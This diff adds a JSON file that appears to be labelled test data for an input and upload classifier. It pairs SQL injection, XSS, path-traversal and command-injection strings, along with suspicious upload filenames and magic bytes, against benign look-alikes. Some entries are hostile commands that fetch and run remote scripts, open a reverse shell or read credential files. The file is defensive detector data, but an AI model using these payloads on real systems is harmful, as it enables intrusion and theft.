@@ -1,0 +1,577 @@
+{
+ "payloads": [
+  {
+   "text": "' OR '1'='1",
+   "label": "sql_injection"
+  },
+  {
+   "text": "admin' --",
+   "label": "sql_injection"
+  },
+  {
+   "text": "1; DROP TABLE users",
+   "label": "sql_injection"
+  },
+  {
+   "text": "' UNION SELECT username,password FROM users--",
+   "label": "sql_injection"
+  },
+  {
+   "text": "1' OR 1=1#",
+   "label": "sql_injection"
+  },
+  {
+   "text": "x' AND SLEEP(5)--",
+   "label": "sql_injection"
+  },
+  {
+   "text": "\" or \"\"=\"",
+   "label": "sql_injection"
+  },
+  {
+   "text": "1 UNION ALL SELECT NULL,NULL",
+   "label": "sql_injection"
+  },
+  {
+   "text": "'; EXEC xp_cmdshell('dir')--",
+   "label": "sql_injection"
+  },
+  {
+   "text": "a' or 'a'='a",
+   "label": "sql_injection"
+  },
+  {
+   "text": "test'/**/OR/**/1=1--",
+   "label": "sql_injection"
+  },
+  {
+   "text": "1) OR (1=1",
+   "label": "sql_injection"
+  },
+  {
+   "text": "'; WAITFOR DELAY '0:0:5'--",
+   "label": "sql_injection"
+  },
+  {
+   "text": "%27%20OR%20%271%27%3D%271",
+   "label": "sql_injection"
+  },
+  {
+   "text": "1; DELETE FROM files",
+   "label": "sql_injection"
+  },
+  {
+   "text": "<script>alert(1)</script>",
+   "label": "xss"
+  },
+  {
+   "text": "<img src=x onerror=alert(1)>",
+   "label": "xss"
+  },
+  {
+   "text": "javascript:alert(document.cookie)",
+   "label": "xss"
+  },
+  {
+   "text": "<svg onload=alert(1)>",
+   "label": "xss"
+  },
+  {
+   "text": "<iframe src=//evil.com>",
+   "label": "xss"
+  },
+  {
+   "text": "\"><script src=//x.js></script>",
+   "label": "xss"
+  },
+  {
+   "text": "<body onload=fetch('//x')>",
+   "label": "xss"
+  },
+  {
+   "text": "%3Cscript%3Ealert(1)%3C/script%3E",
+   "label": "xss"
+  },
+  {
+   "text": "<a href=\"javascript:void(0)\" onclick=alert(1)>",
+   "label": "xss"
+  },
+  {
+   "text": "<SCRIPT SRC=http://x/a.js>",
+   "label": "xss"
+  },
+  {
+   "text": "<input onfocus=alert(1) autofocus>",
+   "label": "xss"
+  },
+  {
+   "text": "<img src=1 onerror=eval(atob('YQ=='))>",
+   "label": "xss"
+  },
+  {
+   "text": "../../etc/passwd",
+   "label": "path_traversal"
+  },
+  {
+   "text": "..\\..\\windows\\system32",
+   "label": "path_traversal"
+  },
+  {
+   "text": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+   "label": "path_traversal"
+  },
+  {
+   "text": "/etc/shadow",
+   "label": "path_traversal"
+  },
+  {
+   "text": "....//....//etc/passwd",
+   "label": "path_traversal"
+  },
+  {
+   "text": "../../../../proc/self/environ",
+   "label": "path_traversal"
+  },
+  {
+   "text": "files/../../secret",
+   "label": "path_traversal"
+  },
+  {
+   "text": "C:\\Windows\\win.ini",
+   "label": "path_traversal"
+  },
+  {
+   "text": "..%2f..%2fadmin",
+   "label": "path_traversal"
+  },
+  {
+   "text": "../.env",
+   "label": "path_traversal"
+  },
+  {
+   "text": "/proc/self/cmdline",
+   "label": "path_traversal"
+  },
+  {
+   "text": "..\\..\\boot.ini",
+   "label": "path_traversal"
+  },
+  {
+   "text": "; cat /etc/hosts",
+   "label": "command_injection"
+  },
+  {
+   "text": "| whoami",
+   "label": "command_injection"
+  },
+  {
+   "text": "$(id)",
+   "label": "command_injection"
+  },
+  {
+   "text": "`uname -a`",
+   "label": "command_injection"
+  },
+  {
+   "text": "&& curl http://x/s.sh | sh",
+   "label": "command_injection"
+  },
+  {
+   "text": "; ls -la",
+   "label": "command_injection"
+  },
+  {
+   "text": "| nc -e /bin/sh 1.2.3.4 9",
+   "label": "command_injection"
+  },
+  {
+   "text": "a; wget http://evil/x",
+   "label": "command_injection"
+  },
+  {
+   "text": "`whoami`",
+   "label": "command_injection"
+  },
+  {
+   "text": "| bash -i",
+   "label": "command_injection"
+  },
+  {
+   "text": "; powershell -c calc",
+   "label": "command_injection"
+  },
+  {
+   "text": "& cmd /c dir",
+   "label": "command_injection"
+  },
+  {
+   "text": "hello world",
+   "label": "none"
+  },
+  {
+   "text": "MyP@ssw0rd!2024",
+   "label": "none"
+  },
+  {
+   "text": "ABCD-1234",
+   "label": "none"
+  },
+  {
+   "text": "summer2025",
+   "label": "none"
+  },
+  {
+   "text": "correct horse battery staple",
+   "label": "none"
+  },
+  {
+   "text": "Report Q3 final",
+   "label": "none"
+  },
+  {
+   "text": "john.doe@example.com",
+   "label": "none"
+  },
+  {
+   "text": "Password with spaces here",
+   "label": "none"
+  },
+  {
+   "text": "X7K2-LMN9",
+   "label": "none"
+  },
+  {
+   "text": "it's fine",
+   "label": "none"
+  },
+  {
+   "text": "O'Brien",
+   "label": "none"
+  },
+  {
+   "text": "rock & roll",
+   "label": "none"
+  },
+  {
+   "text": "50% off today",
+   "label": "none"
+  },
+  {
+   "text": "a-b-c-d",
+   "label": "none"
+  },
+  {
+   "text": "What is 2+2?",
+   "label": "none"
+  },
+  {
+   "text": "design_v2.pdf",
+   "label": "none"
+  },
+  {
+   "text": "price < 100 and > 50",
+   "label": "none"
+  },
+  {
+   "text": "Mary's file",
+   "label": "none"
+  },
+  {
+   "text": "ticket #4521",
+   "label": "none"
+  },
+  {
+   "text": "C++ notes",
+   "label": "none"
+  },
+  {
+   "text": "user_name",
+   "label": "none"
+  },
+  {
+   "text": "2024-10-06",
+   "label": "none"
+  },
+  {
+   "text": "100% sure",
+   "label": "none"
+  },
+  {
+   "text": "hash#tag",
+   "label": "none"
+  },
+  {
+   "text": "email me at a@b.co",
+   "label": "none"
+  },
+  {
+   "text": "R&D budget",
+   "label": "none"
+  },
+  {
+   "text": "Dr. Smith's plan",
+   "label": "none"
+  },
+  {
+   "text": "path/to/file",
+   "label": "none"
+  },
+  {
+   "text": "notes (draft)",
+   "label": "none"
+  },
+  {
+   "text": "pa$$word",
+   "label": "none"
+  },
+  {
+   "text": "tom and jerry",
+   "label": "none"
+  },
+  {
+   "text": "select a team",
+   "label": "none"
+  },
+  {
+   "text": "drop me a line",
+   "label": "none"
+  },
+  {
+   "text": "update on the plan",
+   "label": "none"
+  },
+  {
+   "text": "insert coin",
+   "label": "none"
+  },
+  {
+   "text": "order by Friday",
+   "label": "none"
+  },
+  {
+   "text": "one or two",
+   "label": "none"
+  },
+  {
+   "text": "this and that",
+   "label": "none"
+  },
+  {
+   "text": "x = y",
+   "label": "none"
+  },
+  {
+   "text": "name=value",
+   "label": "none"
+  }
+ ],
+ "uploads": [
+  {
+   "name": "invoice.pdf.exe",
+   "type": "application/x-msdownload",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "photo.jpg.js",
+   "type": "text/javascript",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "shell.php",
+   "type": "application/x-php",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "setup.exe",
+   "type": "application/octet-stream",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "run.ps1",
+   "type": "text/plain",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "macro.vbs",
+   "type": "text/plain",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "app.apk",
+   "type": "application/vnd.android.package-archive",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "readme.txt.bat",
+   "type": "text/plain",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "backdoor.jsp",
+   "type": "text/plain",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "pic.png",
+   "type": "text/html",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "report.pdf",
+   "type": "image/png",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "data.csv",
+   "type": "application/x-sh",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "document.pdf",
+   "type": "application/pdf",
+   "label": "malicious_upload",
+   "head": [
+    77,
+    90,
+    144,
+    0
+   ]
+  },
+  {
+   "name": "image.jpg",
+   "type": "image/jpeg",
+   "label": "malicious_upload",
+   "head": [
+    127,
+    69,
+    76,
+    70
+   ]
+  },
+  {
+   "name": "notes.txt",
+   "type": "text/plain",
+   "label": "malicious_upload",
+   "head": [
+    35,
+    33,
+    47,
+    98
+   ]
+  },
+  {
+   "name": "evil\u202egpj.exe",
+   "type": "",
+   "label": "malicious_upload"
+  },
+  {
+   "name": "report.pdf",
+   "type": "application/pdf",
+   "label": "none",
+   "head": [
+    37,
+    80,
+    68,
+    70
+   ]
+  },
+  {
+   "name": "holiday.jpg",
+   "type": "image/jpeg",
+   "label": "none",
+   "head": [
+    255,
+    216,
+    255,
+    224
+   ]
+  },
+  {
+   "name": "logo.png",
+   "type": "image/png",
+   "label": "none",
+   "head": [
+    137,
+    80,
+    78,
+    71
+   ]
+  },
+  {
+   "name": "notes.txt",
+   "type": "text/plain",
+   "label": "none"
+  },
+  {
+   "name": "budget.csv",
+   "type": "text/csv",
+   "label": "none"
+  },
+  {
+   "name": "archive.zip",
+   "type": "application/zip",
+   "label": "none",
+   "head": [
+    80,
+    75,
+    3,
+    4
+   ]
+  },
+  {
+   "name": "thesis.final.v2.docx",
+   "type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+   "label": "none"
+  },
+  {
+   "name": "slides.pptx",
+   "type": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+   "label": "none"
+  },
+  {
+   "name": "my.photo.2024.jpeg",
+   "type": "image/jpeg",
+   "label": "none"
+  },
+  {
+   "name": "data.v1.csv",
+   "type": "application/vnd.ms-excel",
+   "label": "none"
+  },
+  {
+   "name": "readme",
+   "type": "text/plain",
+   "label": "none"
+  },
+  {
+   "name": "scan.PDF",
+   "type": "application/pdf",
+   "label": "none"
+  },
+  {
+   "name": "video.mp4",
+   "type": "video/mp4",
+   "label": "none"
+  },
+  {
+   "name": "song.mp3",
+   "type": "audio/mpeg",
+   "label": "none"
+  },
+  {
+   "name": "invoice 2024.xlsx",
+   "type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+   "label": "none"
+  },
+  {
+   "name": "notes.md",
+   "type": "text/markdown",
+   "label": "none"
+  },
+  {
+   "name": "icon.gif",
+   "type": "image/gif",
+   "label": "none"
+  }
+ ]
+}
